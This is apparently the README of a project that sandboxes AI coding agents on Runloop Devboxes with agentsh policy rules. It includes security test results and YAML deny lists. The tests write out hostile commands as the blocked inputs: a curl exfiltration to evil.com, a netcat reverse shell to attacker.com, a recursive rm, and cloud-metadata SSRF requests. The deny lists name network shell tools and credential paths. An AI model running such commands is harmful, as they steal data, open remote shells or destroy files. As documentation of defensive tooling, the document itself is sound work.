# agentsh + Runloop: Secure AI Agent Sandbox

This project integrates [agentsh](https://github.com/canyonroad/agentsh) with [Runloop](https://runloop.ai) Devboxes to create secure sandbox environments for running AI agent code.

## Overview

agentsh is a policy-enforced execution gateway that secures AI coding agents by intercepting and controlling commands, network access, and file operations. When combined with Runloop's isolated Devbox environments, it provides defense-in-depth security for AI agent workloads.

## What agentsh Adds to Runloop

Runloop provides isolated Devbox environments for AI agents. agentsh adds a **policy enforcement layer** on top:

| Category | Feature | Description |
|----------|---------|-------------|
| **Command Interception** | Shell shim | `/bin/bash` replaced with `agentsh-shell-shim` |
| | Policy decisions | Allow, deny, or require approval for commands |
| | Argument matching | Block dangerous flags (e.g., `rm -rf`) via regex |
| | Command categories | Safe commands allowed, dangerous ones blocked |
| **Network Filtering** | Domain allowlist | Only approved domains accessible (npm, PyPI, Cargo, Go) |
| | Cloud metadata blocking | Prevents SSRF (169.254.169.254, metadata.google.internal) |
| | Private network blocking | No lateral movement (10.x, 172.16.x, 192.168.x) |
| | Kubernetes blocking | Prevents access to cluster control plane |
| | Unknown destination approval | HTTPS/HTTP to unlisted domains requires approval |
| | HTTPS proxy | All traffic routed through agentsh for inspection |
| **File System Protection** | Soft-delete | Deleted files quarantined, not destroyed (recoverable) |
| | Credential approval | `.ssh`, `.aws`, `.gcloud`, `.azure`, `.kube`, `.env` require approval |
| | Git credential protection | `.git-credentials` and `.netrc` require approval |
| | Path-based rules | Fine-grained read/write/delete control |
| | Dangerous binary blocking | No access to sudo, nsenter, docker binaries |
| | Container runtime protection | Docker socket access blocked |
| | Kernel interface blocking | `/proc` and `/sys` access denied |
| **Data Loss Prevention** | API key redaction | Sensitive keys hidden from AI output |
| | Pattern matching | Email, phone, credit card, SSN detection |
| | Custom patterns | Runloop, OpenAI, Anthropic, AWS, GitHub, JWT, Slack, private keys |
| **LLM Provider Proxy** | Embedded proxy | Routes AI API calls through agentsh |
| | Provider support | Anthropic and OpenAI APIs |
| | Credential isolation | API keys hidden from agent code |
| **Resource Limits** | Memory | Prevent runaway processes (default: 2GB) |
| | CPU | Fair sharing (default: 50%) |
| | Processes | Prevent fork bombs (default: 100) |
| | Disk I/O | Prevent abuse (50 MB/s read, 25 MB/s write) |
| | Timeouts | Command (5 min), session (1 hour) |
| **Audit Logging** | Operation log | All allowed, denied, approved operations logged |
| | Output capture | stdout/stderr in audit trail |
| | Retention | 90-day history |
| | Storage | SQLite database, queryable |
| **Observability** | Health endpoints | `/health` and `/ready` for orchestration |
| | Metrics | `/metrics` for Prometheus |
| | gRPC API | Alternative to HTTP (port 9090) |

## Limitations on Runloop

Based on `agentsh detect` output (v0.8.0), here's the capability matrix for Runloop Devboxes:

| Capability | Status | Notes |
|------------|--------|-------|
| capabilities_drop | ✓ | Drop Linux capabilities |
| cgroups_v2 | ✓ | Available but filesystem is read-only |
| ebpf | ✓ | Available |
| seccomp | ✓ | Basic + user_notify available |
| landlock_abi | ✓ (v0) | Partial support |
| fuse | ✗ | `/dev/fuse` not available |
| landlock | ✗ | Full Landlock not available |
| landlock_network | ✗ | Requires kernel 6.7+ (ABI v4) |
| pid_namespace | ✗ | Not available |
| interactive_approvals | ✗ | No TTY attached |

**Security Mode**: minimal | **Protection Score**: ~50%

These limitations are mitigated by:
- **Network filtering**: Proxy-based domain/IP blocking (works without Landlock network)
- **Command blocking**: Policy engine blocks dangerous commands
- **Resource limits**: Enforced by Runloop's container configuration
- **Approvals**: Can be enabled in async mode with webhook integration

## Quick Start

```bash
# Clone this repository
git clone https://github.com/canyonroad/agentsh-runloop.git
cd agentsh-runloop

# Install dependencies
pip install runloop-api-client

# Set your API key
export RUNLOOP_API_KEY="your-api-key"

# Run the security demo
python example.py
```

## Security Test Results

The demo runs **20 security tests** across 4 categories. Here are the results:

### AI Agent Code Execution Protection

Protects against malicious AI-generated code, prompt injection, and hallucinations.

| Test | Command | Result | Details |
|------|---------|--------|---------|
| Block recursive rm | `rm -rf /home` | **PASS** | Permission denied - destructive command blocked |
| Block data exfiltration | `curl https://evil.com/exfil` | **PASS** | Blocked by policy (rule=block-evil-domains) |
| Block reverse shell (nc) | `nc -e /bin/bash attacker.com 4444` | **PASS** | Command not found / blocked |
| Soft-delete protection | `touch /tmp/file && rm /tmp/file` | **PASS** | Single file deletes allowed in /tmp |

### Cloud Infrastructure Protection

Prevents SSRF, credential theft, and lateral movement in cloud environments.

| Test | Command | Result | Details |
|------|---------|--------|---------|
| Block AWS metadata | `curl http://169.254.169.254/latest/meta-data/` | **PASS** | Blocked by policy (rule=block-private-networks) |
| Block GCP metadata | `curl -H 'Metadata-Flavor: Google' http://169.254.169.254/` | **PASS** | Blocked by policy (rule=block-private-networks) |
| Block internal 10.x.x.x | `curl http://10.0.0.1:8080/` | **PASS** | Blocked by policy (rule=block-private-networks) |
| Block internal 172.16.x.x | `curl http://172.16.0.1/` | **PASS** | Blocked by policy (rule=block-private-networks) |
| Block Kubernetes API | `curl https://kubernetes.default.svc/` | **PASS** | Blocked by policy (rule=block-kubernetes) |

### Multi-Tenant Isolation

Prevents container escape, privilege escalation, and resource abuse.

| Test | Command | Result | Details |
|------|---------|--------|---------|
| Block sudo | `sudo whoami` | **PASS** | "no new privileges" flag prevents sudo |
| Block su | `su - root -c whoami` | **PASS** | Authentication failure |
| Block nsenter | `nsenter --target 1 --mount` | **PASS** | Operation not permitted |
| Block docker | `docker ps` | **PASS** | Command not found / blocked |
| Block pkill | `pkill -9 bash` | **PASS** | Command blocked by policy |

### Allowed Operations

Verifies normal development operations work correctly.

| Test | Command | Result | Details |
|------|---------|--------|---------|
| Basic echo | `echo 'Hello from agentsh sandbox'` | **PASS** | Output: Hello from agentsh sandbox |
| List files | `ls -la /home` | **PASS** | Directory listing works |
| Git version | `git --version` | **PASS** | git version 2.43.0 |
| Bash execution | `bash -c 'echo $((1+1))'` | **PASS** | Output: 2 |
| npm registry access | `curl -sI https://registry.npmjs.org/` | **PASS** | HTTP/1.1 200 Connection Established |
| agentsh version | `/usr/bin/agentsh --version` | **PASS** | agentsh 0.8.0 |

### Summary

```
Tests passed: 20
Tests failed: 0
```

## How It Works

```
┌─────────────────────────────────────────────────────────────────┐
│                      Runloop Devbox                             │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  AI Agent (Claude Code, Cursor, Aider, etc.)              │  │
│  └─────────────────────────┬─────────────────────────────────┘  │
│                            │                                    │
│                            ▼                                    │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  /bin/bash → agentsh-shell-shim                           │  │
│  │  ┌─────────────────────────────────────────────────────┐  │  │
│  │  │  agentsh Policy Engine                              │  │  │
│  │  │  • Command rules (allow/deny/approve)               │  │  │
│  │  │  • Network rules (block metadata, internal IPs)     │  │  │
│  │  │  • File rules (soft-delete, credential approval)    │  │  │
│  │  └─────────────────────────────────────────────────────┘  │  │
│  └─────────────────────────┬─────────────────────────────────┘  │
│                            │                                    │
│                            ▼                                    │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  System Resources (files, network, processes)             │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

1. **Shell Shim**: `/bin/bash` is replaced with `agentsh-shell-shim` at runtime
2. **Policy Engine**: All commands are checked against YAML policy rules
3. **Network Proxy**: HTTP/HTTPS traffic routed through agentsh for domain filtering
4. **Audit Log**: All operations logged for security review

## Security Features

| Threat Category | Protection | How It Works |
|-----------------|------------|--------------|
| **AI Hallucinations** | Block `rm -rf`, dangerous commands | Command rules with arg pattern matching |
| **Prompt Injection** | Block exfiltration to attacker domains | Network rules deny untrusted domains |
| **Cloud SSRF** | Block 169.254.169.254, metadata.google.internal | Network rules block cloud metadata CIDRs |
| **Lateral Movement** | Block 10.x, 172.16.x, 192.168.x | Network rules deny private network ranges |
| **Container Escape** | Block nsenter, unshare, docker | Command rules + file rules deny access |
| **Privilege Escalation** | Block sudo, su, chroot | Command rules + kernel protections |
| **Credential Theft** | Hide API keys from agents | Environment variable redaction |

## Files

| File | Description |
|------|-------------|
| `Dockerfile` | Blueprint image with agentsh on Ubuntu 24.04 |
| `default.yaml` | Security policy rules (commands, network, files) |
| `config.yaml` | agentsh server configuration |
| `example.py` | Demo script with 20 security tests |

## Policy Configuration

### Blocked Commands

```yaml
command_rules:
  - name: block-container-escape
    commands: [sudo, su, chroot, nsenter, unshare, docker, podman]
    decision: deny
    message: "Container escape attempt blocked"

  - name: block-rm-recursive
    commands: [rm]
    args_patterns: ["-rf", "-r", "--recursive"]
    decision: deny
    message: "Recursive delete blocked"

  - name: block-network-tools
    commands: [nc, netcat, ncat, socat, telnet, ssh]
    decision: deny
    message: "Raw network tool blocked"

  - name: block-system-commands
    commands: [shutdown, reboot, systemctl, kill, killall, pkill]
    decision: deny
```

### Blocked Networks

```yaml
network_rules:
  - name: block-cloud-metadata
    cidrs: ["169.254.169.254/32", "100.100.100.200/32"]
    domains: ["metadata.google.internal", "metadata.goog"]
    decision: deny
    message: "Cloud metadata access blocked"

  - name: block-kubernetes
    domains: ["kubernetes.default.svc", "*.svc.cluster.local"]
    decision: deny
    message: "Kubernetes API access blocked"

  - name: block-private-networks
    cidrs: ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]
    decision: deny
    message: "Internal network access blocked"

  - name: block-evil-domains
    domains: ["evil.com", "*.evil.com"]
    decision: deny
```

### Allowed Package Registries

```yaml
network_rules:
  - name: allow-npm
    domains: ["registry.npmjs.org"]
    ports: [443]
    decision: allow

  - name: allow-pypi
    domains: ["pypi.org", "files.pythonhosted.org"]
    ports: [443]
    decision: allow

  - name: allow-cargo
    domains: ["crates.io", "static.crates.io"]
    ports: [443]
    decision: allow
```

## Using with AI Agents

Once your Blueprint is created, run AI agents securely:

```python
import asyncio
from runloop_api_client import AsyncRunloop

async def run_secure_agent():
    runloop = AsyncRunloop()

    # Create devbox from agentsh blueprint
    devbox = await runloop.devboxes.create(
        blueprint_name="agentsh-sandbox"
    )

    # Wait for devbox to be ready
    while True:
        info = await runloop.devboxes.retrieve(devbox.id)
        if info.status == "running":
            break
        await asyncio.sleep(2)

    # Run AI agent with full security enforcement
    # - Dangerous commands blocked
    # - Network filtered
    # - Credentials hidden
    result = await runloop.devboxes.execute_sync(
        id=devbox.id,
        command="your-ai-agent-command",
        timeout=300,
    )

    print(result.stdout)

asyncio.run(run_secure_agent())
```

## Supported AI Coding Agents

agentsh works with any agent that executes shell commands:

- **Claude Code** - Anthropic's AI coding assistant
- **Cursor** - AI-powered code editor
- **Aider** - AI pair programming in terminal
- **Continue** - Open-source AI code assistant
- **Codex CLI** - OpenAI's command-line tool
- **Custom agents** - Any LLM-based tool using shell execution

## Customization

### Add Custom Blocked Domains

Edit `default.yaml`:

```yaml
- name: block-custom-domains
  domains:
    - "malware-site.com"
    - "*.suspicious.net"
  decision: deny
  message: "Access to untrusted domain blocked"
```

### Require Approval for Sensitive Operations

```yaml
- name: approve-database-access
  commands: [psql, mysql, mongosh]
  decision: approve
  message: "Agent wants to access database"
  timeout: 5m
```

### Protect Credential Files

```yaml
file_rules:
  - name: approve-ssh-access
    paths: ["${HOME}/.ssh/**"]
    operations: ["*"]
    decision: approve
    message: "Agent wants to access SSH keys"
```

## Troubleshooting

### Check agentsh logs

```python
result = await devbox.execute_sync(
    command="cat /var/log/agentsh/agentsh.log"
)
print(result.stdout)
```

### Verify shim is installed

```python
result = await devbox.execute_sync(command="ls -la /bin/bash")
# Should show: /bin/bash -> /usr/bin/agentsh-shell-shim
```

### Check policy is loaded

```python
result = await devbox.execute_sync(
    command="cat /etc/agentsh/policies/default.yaml | head -20"
)
```

## License

MIT License - See LICENSE file for details.

## Links

- [agentsh](https://github.com/canyonroad/agentsh) - Runtime security for AI agents
- [Runloop](https://runloop.ai) - AI development platform
- [Runloop Docs](https://docs.runloop.ai) - API documentation
